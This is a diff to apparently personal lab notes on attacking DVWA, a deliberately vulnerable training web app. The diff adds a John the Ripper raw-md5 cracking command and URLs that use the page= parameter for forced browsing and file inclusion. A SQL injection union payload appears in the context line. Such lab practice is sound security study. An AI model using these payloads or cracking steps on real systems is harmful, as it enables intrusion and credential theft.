@@ -70,4 +70,19 @@ ppp' or '0' = '0' union select table_schema, table_name from information_schema.
 sudo john password.txt
 ```
 
-- 
+- Run John The Ripper with various suggested formats
+```
+sudo john --format=raw-md5 password.txt
+```
+
+## Forced Browsing
+- Manipulate the value contained in `page=` to find hidden files
+```
+http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
+```
+
+## File Inclusion
+- Change URL below to 
+```
+http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
+```
